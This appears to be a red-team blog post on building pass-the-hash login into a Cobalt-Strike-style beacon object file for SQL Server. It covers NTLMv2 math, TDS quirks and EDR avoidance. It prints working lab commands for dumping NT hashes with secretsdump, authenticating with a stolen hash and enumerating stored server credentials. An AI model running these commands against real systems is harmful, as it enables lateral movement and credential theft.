---
layout: post
title: "Pass-the-Hash against SQL Server from a BOF"
date: 2026-04-08
categories: [Red Team, Lateral Movement]
tags: [BOF, MSSQL, TDS, NTLMv2, Pass-the-Hash]
---

Most BOF projects that need a Microsoft SQL Server connection end up shipping a copy of `sqlcmd.exe`, or they P/Invoke into `msodbcsql.dll`, or they load the .NET CLR and call into `System.Data.SqlClient`. Every one of those lights up EDR. `sqlcmd.exe` writes to disk. `msodbcsql.dll` shows up in the beacon's loaded modules list as a bright red signature. `clr.dll` guarantees you're going to answer questions from the incident responder.

So for [**mssqlbof**](https://github.com/MazX0p/mssqlbof) I wrote the TDS 7.4 protocol stack by hand in C, anchored it to Windows via Schannel for TLS and SSPI for Kerberos, and that got `--auth sspi` and `--auth sql` working quickly. Then a customer asked why there was no `--hash` flag for pass-the-hash. I thought about it for ten minutes, realized SSPI would not help, and started down the rabbit hole this post is about.

## The thing SSPI will not do

`AcquireCredentialsHandleW` takes either `NULL` (the current thread token) or a `SEC_WINNT_AUTH_IDENTITY_W` filled with a plaintext username and password. The NTLM provider derives the NT hash internally. There is no documented way to hand it a hash that it will use as-is.

Mimikatz `sekurlsa::pth` works around this by patching `lsass.exe` at runtime. That is the opposite of what you want from a BOF — a BOF lives for a few hundred milliseconds, runs on whatever beacon thread the operator aimed it at, and is gone. You are not patching other processes from inside `go()`.

The clean path — the one Impacket and `ntlmrelayx` and every other client-side PTH tool actually takes — is to ignore SSPI and build the NTLMSSP messages yourself. Type 1 NEGOTIATE, Type 2 CHALLENGE parse, NTLMv2 response computation, Type 3 AUTHENTICATE. A BOF has access to `bcrypt.dll`, which means HMAC-MD5 is a three-call exercise, which means you already have everything you need.

## The shape of the TDS login

Before diving into the NTLM layer, here is what the whole conversation between the BOF and SQL Server looks like when `--auth ntlm --hash` is in effect:

```
   BOF (beacon)                        SQL Server
   ------------                        ----------
       |                                   |
       | 1. TCP SYN  (1433)                |
       | --------------------------------> |
       | <-------------------------------- |
       |                                   |
       | 2. PRELOGIN (type 0x12)           |
       | --------------------------------- |
       |    version, encryption=OFF        |
       | <-------------------------------- |
       |                                   |
       | 3. TLS handshake wrapped inside   |
       |    TDS PRELOGIN packets           |
       | <==============================>  |
       |                                   |
       | 4. LOGIN7 (type 0x10) [encrypted] |
       |    fIntSecurity=1                 |
       |    SSPI field = NTLMSSP Type1     |
       | --------------------------------> |
       |                                   |
       | 5. TABULAR (type 0x04) [PLAIN]    |
       |    TDS_TOK_SSPI (0xED) payload    |
       |    = NTLMSSP Type2 CHALLENGE      |
       | <-------------------------------- |
       |                                   |
       | 6. SSPI (type 0x11) [PLAIN]       |
       |    NTLMSSP Type3 AUTHENTICATE     |
       |    (NT hash never transmitted)    |
       | --------------------------------> |
       |                                   |
       | 7. TABULAR (type 0x04) [PLAIN]    |
       |    LOGINACK + ENVCHANGE + DONE    |
       | <-------------------------------- |
       |                                   |
       | 8. SQLBatch + result set          |
       | <==============================>  |
```

Two quirks in there worth naming immediately. **Step 4** is encrypted with TLS — SQL Server wraps the login even when encryption was negotiated as `OFF` — but the server answers **Step 5 in plaintext**. This asymmetric "login-only" TLS is a SQL Server thing you have to handle explicitly. And **Step 6 is also plaintext**: if you try to TLS-wrap the SSPI continuation packet, SQL Server closes the socket with no error. The server only decrypts the first LOGIN7 packet.

## The NTLMv2 math

Everything in **Step 6** is derived from the hash + the challenge in step 5. `[MS-NLMP]` §3.3.2 is the spec. In pseudocode:

```
NTLMv2Hash  = HMAC_MD5(NTHash, UPPER(user) || domain)      // UTF-16LE

temp        = 0x01 0x01 0x00 0x00 0x00 0x00 0x00 0x00
              || timestamp(8)            // FILETIME little-endian
              || clientChallenge(8)      // random 8 bytes
              || 0x00 0x00 0x00 0x00
              || serverTargetInfo        // verbatim from Type 2
              || 0x00 0x00 0x00 0x00

NTProofStr  = HMAC_MD5(NTLMv2Hash, serverChallenge || temp)
NTLMv2Resp  = NTProofStr || temp         // goes in Type 3 NtChallengeResponse
```

The LMv2 companion is almost the same:

```
LMv2Resp    = HMAC_MD5(NTLMv2Hash, serverChallenge || clientChallenge)
              || clientChallenge
```

The only per-call randomness is that 8-byte client challenge. Everything else is derived, which means the whole thing is reproducible and easy to diff against a known-good implementation.

And the data flow for what goes where:

```
     NT hash        User         Domain
   (16 bytes)     (UTF-16LE)   (UTF-16LE)
       \            /             /
        \          /             /
         \        /             /
          +------v------+      /
          |  HMAC-MD5   |<----+
          +------+------+
                 |
                 v
            NTLMv2 hash                 server challenge
           (session key)                  (from Type 2)
                 |                              |
                 |              +---------------+
                 |              |
                 v              v
          +-------------------------+
          |  HMAC-MD5  (serverCh || |
          |             temp)      |
          +------------+------------+
                       |
                       v
                  NTProofStr (16)
                       |
                       +----> || temp ---> Type 3 NtChallengeResponse
                       |
                       +----> + clientCh ---> Type 3 LmChallengeResponse
```

## The BOF shape

The TDS side of the handshake stays the same as the plaintext-NTLM case. In the BOF, the changes are scoped:

- **`login7.c`** dispatches on the auth mode. When `--hash` is set, it skips `tds_sspi_init` entirely and calls `ntlm_pth_build_type1` to produce the 40-byte NEGOTIATE. That message goes straight into the `SSPI` field of LOGIN7.
- **`tokens.c`** now handles the `TDS_TOK_SSPI` (0xED) token that carries the Type 2 challenge in the server's response. It copies the payload onto the connection struct so the outer pump can see it.
- **`connect.c`**'s multi-leg pump branches: it either calls `tds_sspi_step` with the server's challenge (the old SSPI path), or it calls `ntlm_pth_build_type3` directly (the PTH path).
- **`ntlm_pth.c`** is new. It is 270 lines including comments. HMAC-MD5 is four BCrypt calls wrapped in a helper. Everything else is byte-banging into a `uint8_t` buffer.

The BCrypt imports in `dynimports.h`:

```c
DECLSPEC_IMPORT NTSTATUS_BC WINAPI
BCRYPT$BCryptOpenAlgorithmProvider(void**, const wchar_t*, const wchar_t*, ULONG);
DECLSPEC_IMPORT NTSTATUS_BC WINAPI
BCRYPT$BCryptCreateHash(void*, void**, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS_BC WINAPI
BCRYPT$BCryptHashData(void*, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS_BC WINAPI
BCRYPT$BCryptFinishHash(void*, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS_BC WINAPI
BCRYPT$BCryptDestroyHash(void*);
DECLSPEC_IMPORT NTSTATUS_BC WINAPI
BCRYPT$BCryptCloseAlgorithmProvider(void*, ULONG);
```

`bcrypt.dll` is already loaded in every Windows process (Schannel needs it), so these resolve without dragging any new DLLs into the beacon address space.

## The EOM bug

With the code in place, the first test run hit a subtle bug in the TDS token-stream parser. The parser in `src/tds/tokens.c` was stopping on a DONE token, and the 0xED SSPI continuation packet contains no DONE token at all — it is a 0xED followed by payload and that is the entire packet. We were looping forever on the next `tds_packet_recv` waiting for bytes the server would never send, because the server was waiting for _us_ to step the SSPI state machine first.

Fix was a three-line patch: honor the `EOM` flag in the TDS packet header inside `slurp_response`, in addition to the DONE-token heuristic. If the server sets `EOM=1` on a packet, that is the end of the message, full stop.

```c
/* Honor the TDS EOM flag from the packet header. Critical for SSPI
 * continuation responses which contain only a 0xED token and NO DONE
 * token: without this break we'd loop forever waiting for a DONE that
 * never comes. */
if (c->rx_status & TDS_STATUS_EOM) break;
```

## The TLS-asymmetry gotcha

The second thing that bit us is the login-phase TLS asymmetry I mentioned above. When PRELOGIN negotiates `ENCRYPT_OFF`, the server still wraps the first LOGIN7 in TLS. The client encrypts it, the server decrypts it, then answers **in plaintext** because the login is the only thing it wanted encrypted.

Multi-leg SSPI breaks the assumption. The Type 3 AUTHENTICATE we send after the Type 2 CHALLENGE comes back is still part of the login phase, but the TLS wrapper is already gone on the client side for that direction. If you send the continuation as another TLS record, SRV02 simply closes the socket. No error, no log, just RST.

The fix is per-state:

```c
/* After the first LOGIN7 is sent encrypted, SQL Server's asymmetric
 * login-only TLS quirk means subsequent SSPI continuation packets
 * must be sent PLAINTEXT — the server only decrypts the initial
 * LOGIN7. */
if (c->tls_send_state != TDS_TLS_STATE_NONE) {
    c->tls_send_state = TDS_TLS_STATE_NONE;
}
```

This one cost more time to find than it should have, because the failure mode was identical to "the server hates our Type 3": closed socket, no response. Only tcpdumping the exchange from the Proxmox bridge showed the client happily sending a TLS record after the server had already stopped participating in the TLS session.

## The first working attempt

At this point the manual NTLMv2 code was compiling clean and the wire exchange looked like what Impacket did: LOGIN7 + Type 1, `0xED` + Type 2, raw Type 3 in a `TDS_TYPE_SSPI` packet. And the response from SQL Server was:

```
[!] connect failed (-5): Login failed. The login is from an untrusted
    domain and cannot be used with Integrated authentication.
```

The interesting thing about that error is that it is **not** a TDS transport failure. The server parsed our Type 3 all the way to the point where it asked the DC "does this NTLMv2 response actually come from SILENTSTRIKE\Administrator with her NT hash," and the DC said no. So either the hash was wrong, or the math was wrong, or the message framing was wrong in a way that ended up with a bad challenge response.

The hash was fine:

```
$ impacket-secretsdump 'Administrator:P@ssw0rd@192.168.0.122' | grep Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
```

And the same hash against the same server through `mssqlclient.py -hashes` worked first try. So the difference had to be in what I was putting on the wire, not in what the server would accept in principle.

## Diffing against Impacket

The cleanest way to find the bug was to capture Impacket doing the thing right next to us doing it wrong, and diff the Type 3 message byte-for-byte.

```
$ tcpdump -i vmbr0 -nn -s0 -w /tmp/impk.pcap 'host 192.168.0.122 and port 1433' &
$ mssqlclient.py -hashes :e19ccf75ee54e06b06a5907af13cef42 \
    'SILENTSTRIKE/Administrator@192.168.0.122' -windows-auth <<< 'exit'
```

Pulling the NTLMSSP AUTH packet out of the capture:

```
$ tshark -r /tmp/impk.pcap -Y 'frame.number==14' -T fields -e tcp.payload \
    | xxd -r -p | xxd | head
00000000: 1101 01c2 0000 0100 4e54 4c4d 5353 5000  ........NTLMSSP.
00000010: 0300 0000 1800 1800 8a00 0000 1801 1801  ................
00000020: a200 0000 1800 1800 5800 0000 1a00 1a00  ........X.......
00000030: 7000 0000 0000 0000 8a00 0000 0000 0000  p...............
00000040: ba01 0000 0502 88a2 0a00 7c4f 0000 000f  ..........|O....
00000050: bcb7 60fb e569 d460 6aee 8375 87e9 5bc8  ..`..i.`j..u..[.
...
```

Two things jumped out immediately.

**First: the LMv2 response field was not zeroed.** Every NTLMv2 reference I had read said "the LMv2 response is optional for NTLMv2 sessions, 24 zero bytes is acceptable." I had dutifully written 24 zero bytes into that field. Impacket was writing a real LMv2 computation. SQL Server apparently disagreed with every reference I had read.

**Second: the NegotiateFlags were different.** I was sending `0xe2888215`. Impacket was sending `0xa2880205`. Specifically, I had `KEY_EXCH`, `SIGN`, and `ALWAYS_SIGN` set. Impacket did not. The only flags Impacket set were:

```
NTLMSSP_NEGOTIATE_UNICODE              0x00000001
NTLMSSP_REQUEST_TARGET                 0x00000004
NTLMSSP_NEGOTIATE_NTLM                 0x00000200
NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSEC  0x00080000
NTLMSSP_NEGOTIATE_TARGET_INFO          0x00800000
NTLMSSP_NEGOTIATE_VERSION              0x02000000
NTLMSSP_NEGOTIATE_128                  0x20000000
NTLMSSP_NEGOTIATE_56                   0x80000000
                                      -----------
                                       0xa2880205
```

Swapping to the Impacket flag set and computing a real LMv2 response produced this on the next run:

```
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
Server         : SRV02\SQLEXPRESS
Version        : 15.0.2000.5 (Express Edition (64-bit))
Current user   : SILENTSTRIKE\Administrator
Is sysadmin    : YES
```

And `--hash 00000000000000000000000000000000` now cleanly fails with the same `untrusted domain` error — which is the expected behavior and gives you a negative test for free.

## What it looks like in practice

From an Adaptix beacon sitting on an unprivileged workstation in the lab, with no domain creds, no local admin, just the operator's own DA hash:

```
my > execute bof mssql.x64.o --action find
SPN                                             Account
MSSQLSvc/SRV02:1433                             SRV02$
MSSQLSvc/SRV02.silentstrike.io:1433             SRV02$

my > execute bof mssql.x64.o --action info --host 192.168.0.122 \
     --auth ntlm --domain SILENTSTRIKE --user Administrator \
     --hash e19ccf75ee54e06b06a5907af13cef42
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
Server         : SRV02\SQLEXPRESS
Version        : 15.0.2000.5 (Express Edition (64-bit))
Current user   : SILENTSTRIKE\Administrator
Is sysadmin    : YES

my > execute bof mssql.x64.o --action privesc --host 192.168.0.122 \
     --auth ntlm --domain SILENTSTRIKE --user Administrator \
     --hash e19ccf75ee54e06b06a5907af13cef42
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
=== Privesc surface enumeration ===
[1] sysadmin: YES — already

my > execute bof mssql.x64.o --action passwords --host 192.168.0.122 \
     --auth ntlm --domain SILENTSTRIKE --user Administrator \
     --hash e19ccf75ee54e06b06a5907af13cef42
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
Linked-server logins:
  SRV02_LOOP -> sa
Server credentials:
  BackupCred -> identity=BACKUP\svc_backup
  AzureCred  -> identity=azure\admin
```

No ODBC driver loaded. No CLR. No PowerShell. No `make_token` dance. The beacon's loaded module list is the same after as it was before.

## The minor bug I am not proud of

Once PTH started working, SQL auth broke. Specifically, the first SQLBatch sent immediately after a successful multi-leg login was returning empty data in the `SUSER_SNAME()` column of the first row. A second query on the same connection always worked.

The workaround is a primer `SELECT` inside `do_connect` that runs a throwaway `SELECT SUSER_SNAME(), @@SERVERNAME`, reads the row, and writes it out through `BeaconPrintf`. Without the `BeaconPrintf` call, the corruption stays. With it, every subsequent query is clean. That is the line every mssqlbof action opens with:

```
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
```

I am fairly sure the actual bug is in how the multi-leg pump handles leftover bytes between the final LOGINACK packet and whatever the server queues next, and the primer plus `BeaconPrintf` combination either drains the stale bytes or changes the heap layout enough that the follow-up query reads a fresh allocation. It is tracked for the next release. It is the kind of bug that stops being a bug the moment you understand it, so the right fix is to understand it.

## What's next

- The real fix for the post-multi-leg SQLBatch corruption. It deserves to be a real fix and not a primer dance.
- Recursive linked-server walking via nested `OPENQUERY` with cycle detection.
- A CLR-assembly exec method as an alternative to `xp_cmdshell`, for when you need to stay quiet.
- Cross-forest Kerberos for `--auth sspi` against SQL hosts sitting in a trusted forest.
- A pass-the-key mode (`--aes256 <hex>`) that reuses the `ntlm_pth.c` scaffold but issues Kerberos instead of NTLM.

The repo is at [`MazX0p/mssqlbof`](https://github.com/MazX0p/mssqlbof). Issues and wire captures welcome.

---

_Parts of the documentation in the repo were drafted with the help of Anthropic's Claude Code. The code is hand-written and lab-verified against a real domain-joined SQL Server 2019; the AI was used the way you'd use a very patient editor — to turn wire captures and scratch notes into readable prose and to argue about where the NTLMv2 flag soup came from until it matched Impacket._
